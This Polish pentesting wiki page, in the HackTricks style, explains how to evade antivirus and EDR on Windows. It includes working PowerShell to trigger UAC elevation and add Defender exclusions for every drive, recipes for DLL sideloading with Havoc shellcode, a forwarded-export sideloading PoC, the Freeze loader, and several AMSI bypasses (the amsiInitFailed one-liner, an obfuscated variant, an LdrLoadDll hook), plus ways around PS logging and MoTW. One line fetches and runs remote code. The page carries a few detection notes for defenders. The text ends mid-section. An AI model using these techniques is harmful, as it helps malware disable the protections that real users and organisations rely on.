# Ominięcie antywirusa (AV)

{{#include ../banners/hacktricks-training.md}}

**Stronę napisał** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymaj Defender

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymania działania Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymania działania Windows Defender, podszywając się pod inny AV.
- [Wyłącz Defender jeśli masz uprawnienia administratora](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed ingerencją w Defendera

Publiczne loadery podszywające się pod cheaty do gier często dystrybuowane są jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podniesienie uprawnień** i dopiero potem wyłączają Defendera. Przebieg jest prosty:

1. Sprawdza kontekst administratora poleceniem `net session`. Polecenie wykona się pomyślnie tylko wtedy, gdy wywołujący ma prawa administratora, więc niepowodzenie oznacza, że loader działa jako zwykły użytkownik.
2. Natychmiast ponownie uruchamia się z werbem `RunAs`, aby wywołać oczekiwany monit zgody UAC, zachowując jednocześnie oryginalną linię poleceń.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Ofiary już wierzą, że instalują „cracked” oprogramowanie, więc monit jest zwykle zaakceptowany, dając malware uprawnienia potrzebne do zmiany polityki Defendera.

### Ogólne `MpPreference` wykluczenia dla każdej litery dysku

Po eskalacji, łańcuchy w stylu GachiLoader maksymalizują luki w wykrywaniu Defendera zamiast całkowicie wyłączać usługę. Loader najpierw zabija GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a następnie wprowadza **niezwykle szerokie wykluczenia**, tak że każdy profil użytkownika, katalog systemowy i dysk wymienny stają się nieskanowalne:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Pętla przeszukuje każdy zamontowany system plików (D:\, E:\, dyski USB itp.), więc **każdy przyszły payload upuszczony gdziekolwiek na dysku jest ignorowany**.
- Wykluczenie rozszerzenia `.sys` ma charakter przyszłościowy — atakujący zachowują opcję załadowania niesygnowanych sterowników później bez ponownego dotykania Defendera.
- Wszystkie zmiany trafiają pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, co pozwala późniejszym etapom potwierdzić, że wykluczenia utrzymują się lub je rozszerzyć bez ponownego wywoływania UAC.

Ponieważ żaden serwis Defendera nie jest zatrzymany, naiwny monitoring zdrowia nadal zgłasza “antivirus active”, mimo że skanowanie w czasie rzeczywistym nigdy nie dotyka tych ścieżek.

## **AV Evasion Methodology**

Obecnie AV używają różnych metod sprawdzania czy plik jest złośliwy: wykrywanie statyczne, analiza dynamiczna, a w przypadku bardziej zaawansowanych EDR — analiza behawioralna.

### **Static detection**

Wykrywanie statyczne polega na oznaczaniu znanych złośliwych ciągów lub sekwencji bajtów w binarium lub skrypcie, oraz na wyciąganiu informacji z samego pliku (np. file description, company name, digital signatures, icon, checksum itp.). Oznacza to, że używanie znanych publicznych narzędzi może zwiększyć szansę wykrycia, ponieważ prawdopodobnie już zostały przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów obejścia tego typu detekcji:

- **Encryption**

Jeśli zaszyfrujesz binarium, AV nie będzie w stanie wykryć programu, ale będziesz potrzebował jakiegoś loadera do odszyfrowania i uruchomienia programu w pamięci.

- **Obfuscation**

Czasami wystarczy zmienić kilka ciągów w binarium lub skrypcie, żeby przejść obok AV, ale w zależności od tego, co próbujesz zatuszować, może to być czasochłonne.

- **Custom tooling**

Jeśli opracujesz własne narzędzia, nie będzie znanych złych sygnatur, ale zajmuje to dużo czasu i wysiłku.

> [!TIP]
> Dobrym narzędziem do sprawdzania wykrywalności przez Windows Defender w trybie statycznym jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli on plik na wiele segmentów i zleca Defenderowi przeskanowanie każdego z nich osobno — w ten sposób może dokładnie wskazać, które ciągi lub bajty w binarium są oznaczane.

Gorąco polecam sprawdzić tę [YouTube playlistę](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktycznym AV Evasion.

### **Dynamic analysis**

Analiza dynamiczna polega na uruchomieniu Twojego binarium w sandboxie przez AV i obserwacji złośliwej aktywności (np. próba odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidump na LSASS itp.). Ta część może być trudniejsza, ale oto kilka rzeczy, które możesz zrobić, żeby ominąć sandboxy.

- **Sleep before execution** W zależności od implementacji, może to być świetny sposób na ominięcie dynamicznej analizy AV. AV mają bardzo krótki czas na skanowanie plików, aby nie przerywać pracy użytkownika, więc użycie długich sleepów może zaburzyć analizę binariów. Problem w tym, że wiele sandboxów AV potrafi po prostu pominąć sleep, w zależności od implementacji.
- **Checking machine's resources** Zwykle sandboxy mają bardzo mało zasobów do dyspozycji (np. < 2GB RAM), w przeciwnym razie mogłyby spowolnić maszynę użytkownika. Możesz też być tu bardzo kreatywny — np. sprawdzając temperaturę CPU lub prędkość wentylatorów; nie wszystko zostanie zaimplementowane w sandboxie.
- **Machine-specific checks** Jeśli chcesz celować w użytkownika, którego stacja robocza jest dołączona do domeny "contoso.local", możesz sprawdzić domenę komputera i porównać ją z zadaną — jeśli się nie zgadza, program może się zakończyć.

Okazuje się, że nazwa komputera w Sandboxie Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim malware przed detonacją — jeśli nazwa pasuje do HAL9TH, oznacza to, że jesteś wewnątrz sandboxa Defendera i możesz spowodować zakończenie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych bardzo dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących walki z sandboxami

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanał</p></figcaption></figure>

Jak już wspomnieliśmy wcześniej, **public tools** w końcu **zostaną wykryte**, więc powinieneś zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz użyć mimikatz**? Czy nie możesz użyć innego projektu, który jest mniej znany i też zrzuca LSASS?

Prawidłowa odpowiedź to prawdopodobnie ta druga. Biorąc mimikatz jako przykład — to prawdopodobnie jedno z, jeśli nie najbardziej oznaczonych narzędzi przez AV i EDR; chociaż projekt jest super, to praca nad omijaniem AV z użyciem mimikatz jest koszmarem, więc po prostu szukaj alternatyw do osiągnięcia tego, co chcesz.

> [!TIP]
> Modyfikując swoje payloady pod kątem unikania wykrycia, upewnij się, że **wyłączyłeś automatyczne przesyłanie próbek** w Defenderze, i proszę, na poważnie — **NIE WGRYWAJ NA VIRUSTOTAL**, jeśli Twoim celem jest osiągnięcie długotrwałej ewazji. Jeśli chcesz sprawdzić, czy dany payload jest wykrywany przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj tam, aż będziesz zadowolony z wyniku.

## EXEs vs DLLs

Kiedykolwiek to możliwe, zawsze **priorytetowo używaj DLLi do evasion** — z mojego doświadczenia, pliki DLL są zazwyczaj **znacznie mniej wykrywane** i analizowane, więc to bardzo prosty trik, żeby uniknąć wykrycia w niektórych przypadkach (oczywiście jeśli Twój payload ma sposób na uruchomienie się jako DLL).

Jak widać na tym obrazku, DLL payload z Havoc ma współczynnik wykrywalności 4/26 w antiscan.me, podczas gdy EXE ma 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>porównanie antiscan.me normalnego Havoc EXE payload vs normalnego Havoc DLL</p></figcaption></figure>

Teraz pokażemy kilka sztuczek, których możesz użyć z plikami DLL, aby być znacznie bardziej ukrytym.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL używaną przez loader przez umieszczenie aplikacji ofiary i złośliwych payloadów obok siebie.

Możesz sprawdzić programy podatne na DLL Sideloading używając [Siofra](https://github.com/Cybereason/siofra) i poniższego skryptu powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ta komenda wypisze listę programów podatnych na DLL hijacking w katalogu "C:\Program Files\\" oraz pliki DLL, które próbują załadować.

Gorąco polecam, abyś **samodzielnie zbadał programy DLL Hijackable/Sideloadable** — ta technika jest całkiem stealthy przy poprawnym wykonaniu, ale jeśli użyjesz publicznie znanych programów DLL Sideloadable, możesz łatwo zostać złapany.

Sam fakt umieszczenia złośliwego DLL o nazwie, którą program oczekuje załadować, nie spowoduje uruchomienia twojego payload, ponieważ program oczekuje konkretnych funkcji wewnątrz tego DLL. Aby rozwiązać ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania, które program wykonuje z proxy (czyli złośliwego) DLL do oryginalnego DLL, zachowując funkcjonalność programu oraz umożliwiając wykonanie twojego payload.

Będę używać projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/).

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalny przemianowany DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany przy użyciu [SGN](https://github.com/EgeBalci/sgn)) jak i proxy DLL mają współczynnik wykrywalności 0/26 w [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Gorąco polecam obejrzeć [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading oraz także [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o tym, co omówiliśmy szczegółowiej.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest rozwiązywany zgodnie z normalną kolejnością wyszukiwania.

PoC (copy-paste):
1) Skopiuj podpisany systemowy plik DLL do folderu zapisywalnego
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy `NCRYPTPROV.dll` w tym samym folderze. Minimalna implementacja DllMain wystarczy, aby uzyskać wykonanie kodu; nie musisz implementować przekierowanej funkcji, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Wywołaj forward za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Zaobserwowane zachowanie:
- rundll32 (signed) ładuje side-by-side `keyiso.dll` (signed)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface`, loader podąża za forwardem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowana, otrzymasz błąd "missing API" dopiero po tym, jak `DllMain` już się wykonał

Wskazówki do wykrywania:
- Skoncentruj się na forwarded exports, gdzie docelowy moduł nie jest KnownDLL. KnownDLLs są wymienione pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wylistować forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sprawdź inwentarz forwarderów Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Generuj alerty dla łańcuchów procesów/modułów takich jak: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuś polityki integralności kodu (WDAC/AppLocker) oraz zabroń write+execute w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze, aby załadować i uruchomić swój shellcode w sposób ukryty.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Unikanie wykrycia to gra w kotka i myszkę — to, co działa dziś, może być wykryte jutro, więc nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, spróbuj łączyć kilka technik omijania.

## AMSI (Anti-Malware Scan Interface)

AMSI zostało stworzone, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo AVs były w stanie skanować tylko **pliki na dysku**, więc jeśli w jakiś sposób udało się wykonać payloads **bezpośrednio in-memory**, AV nie mogły nic zrobić, bo nie miały wystarczającej widoczności.

Funkcja AMSI jest zintegrowana z następującymi komponentami Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Umożliwia to rozwiązaniom antywirusowym analizę zachowania skryptów poprzez udostępnienie zawartości skryptu w formie niezaszyfrowanej i nieobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje następujące ostrzeżenie w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że poprzedza to `amsi:` a następnie ścieżka do pliku wykonywalnego, z którego skrypt został uruchomiony — w tym wypadku powershell.exe

Nie upuszczaliśmy żadnego pliku na dysk, a mimo to zostaliśmy wykryci in-memory z powodu AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# również przechodzi przez AMSI. Ma to wpływ nawet na `Assembly.Load(byte[])` używane do uruchamiania w pamięci. Dlatego zaleca się używanie niższych wersji .NET (np. 4.7.2 lub starszych) do wykonywania in-memory, jeśli chcesz ominąć AMSI.

Istnieje kilka sposobów na obejście AMSI:

- **Obfuscation**

Ponieważ AMSI działa głównie na podstawie detekcji statycznych, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na ominięcie wykrycia.

Jednak AMSI ma zdolność unobfuscating skryptów nawet gdy mają one wiele warstw, więc obfuscation może okazać się złym wyborem w zależności od tego, jak zostanie wykonane. To sprawia, że ominięcie nie jest trywialne. Chociaż czasem wystarczy zmienić kilka nazw zmiennych i wszystko będzie w porządku — zależy to od stopnia, w jakim coś zostało oznaczone.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane przez załadowanie DLL do procesu powershell (również cscript.exe, wscript.exe itd.), możliwe jest manipulowanie nim nawet podczas działania jako nieuprzywilejowany użytkownik. Z powodu tej wady w implementacji AMSI, badacze znaleźli wiele sposobów na ominięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że dla bieżącego procesu nie zostanie uruchomione skanowanie. Początkowo ujawnił to [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec szerokiemu użyciu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, aby uczynić AMSI bezużytecznym dla bieżącego procesu powershell. Ta linia została oczywiście wykryta przez samo AMSI, więc potrzebna jest pewna modyfikacja, aby użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który wziąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Pamiętaj, że prawdopodobnie to zostanie wykryte po publikacji tego wpisu, więc nie powinieneś publikować żadnego kodu, jeśli chcesz pozostać niewykrytym.

**Memory Patching**

Technika została pierwotnie odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w amsi.dll (odpowiedzialnej za skanowanie danych dostarczonych przez użytkownika) i nadpisaniu jej instrukcjami zwracającymi kod E_INVALIDARG — w ten sposób wynik skanowania będzie 0, co jest interpretowane jako wynik czysty.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) aby uzyskać bardziej szczegółowe wyjaśnienie.

Istnieje też wiele innych technik omijania AMSI przy użyciu powershell — zobacz [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), aby dowiedzieć się o nich więcej.

### Blokowanie AMSI przez zapobieganie załadowaniu amsi.dll (LdrLoadDll hook)

AMSI jest inicjalizowany dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidnym, niezależnym od języka obejściem jest umieszczenie hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nigdy się nie załaduje i dla tego procesu nie zostaną przeprowadzone żadne skany.

Zarys implementacji (x64 C/C++ pseudokod):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Uwagi
- Działa w PowerShell, WScript/CScript oraz w niestandardowych loaderach (wszystko, co w przeciwnym razie załadowałoby AMSI).
- Łącz z przesyłaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w wierszu poleceń.
- Obserwowane w loaderach uruchamianych przez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

To narzędzie [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) również generuje skrypt do obejścia AMSI.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie to działa przez skanowanie pamięci bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisanie jej instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell w wersji 2**

Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowany, więc możesz uruchamiać swoje skrypty bez skanowania przez AMSI. Możesz to zrobić:
```bash
powershell.exe -version 2
```
## Logowanie PS

PowerShell logging to funkcja pozwalająca rejestrować wszystkie polecenia PowerShell wykonywane na systemie. Może być przydatna do audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby obejść logowanie PowerShell, możesz użyć następujących technik:

- **Disable PowerShell Transcription and Module Logging**: Do tego celu możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowany, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Zrób to: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) aby uruchomić sesję PowerShell pozbawioną mechanizmów obronnych (to właśnie używa `powerpick` z Cobal Strike).


## Obfuscation

> [!TIP]
> Kilka technik obfuskacji opiera się na szyfrowaniu danych, co zwiększa entropię binarki i ułatwia jej wykrycie przez AVs i EDRs. Bądź ostrożny z tym i być może stosuj szyfrowanie tylko w określonych sekcjach swojego kodu, które są wrażliwe lub muszą być ukryte.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Podczas analizy malware korzystającego z ConfuserEx 2 (lub komercyjnych forków) często napotykasz kilka warstw ochrony, które blokują dekompilery i sandboksy. Poniższy workflow niezawodnie **przywraca niemal oryginalny IL**, który następnie można zdekompilować do C# w narzędziach takich jak dnSpy lub ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Wyjście zawiera sześć parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne podczas tworzenia własnego unpackera.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flagi:
• `-p crx` – wybierz profil ConfuserEx 2
• de4dot cofnie control-flow flattening, przywróci oryginalne namespaces, klasy i nazwy zmiennych oraz odszyfruje stałe stringi.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku powinieneś zobaczyć normalne API .NET takie jak `Convert.FromBase64String` lub `AES.Create()` zamiast nieczytelnych wrapperów (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonania **bez** konieczności uruchamiania złośliwej próbki – przydatne przy pracy na offline'owej stacji roboczej.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### Jednolinijkowiec
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuskator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie otwartoźródłowego forka zestawu kompilacyjnego [LLVM](http://www.llvm.org/) zdolnego do zwiększenia bezpieczeństwa oprogramowania poprzez code obfuscation i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak użyć `C++11/14` do generowania w czasie kompilacji obfuskowanego kodu bez użycia zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuskowanych operacji generowanych przez framework metaprogramowania szablonów C++, co utrudni osobie chcącej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuskator binarny x64, który potrafi obfuskować różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik metamorfizującego kodu dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to szczegółowy framework do obfuskacji kodu dla języków wspieranych przez LLVM wykorzystujący ROP (return-oriented programming). ROPfuscator obfuskowuje program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP, podważając nasze naturalne pojmowanie normalnego przepływu sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące EXE/DLL na shellcode, a następnie je załadować

## SmartScreen & MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i uruchamiania ich.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa mający na celu ochronę końcowego użytkownika przed uruchomieniem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o podejście oparte na reputacji, co oznacza, że rzadko pobierane aplikacje wywołają SmartScreen, ostrzegając i uniemożliwiając użytkownikowi uruchomienie pliku (chociaż plik nadal można uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu, wraz z URL, z którego został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie Zone.Identifier ADS dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Ważne: pliki wykonywalne podpisane zaufanym certyfikatem podpisu nie wywołają SmartScreen.

Bardzo skutecznym sposobem zapobiegania oznaczeniu payloadów Mark of The Web jest zapakowanie ich w jakiś kontener, np. ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być stosowany na woluminach nie będących NTFS.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloady do kontenerów wyjściowych, aby ominąć Mark-of-the-Web.

Przykładowe użycie:
```bash
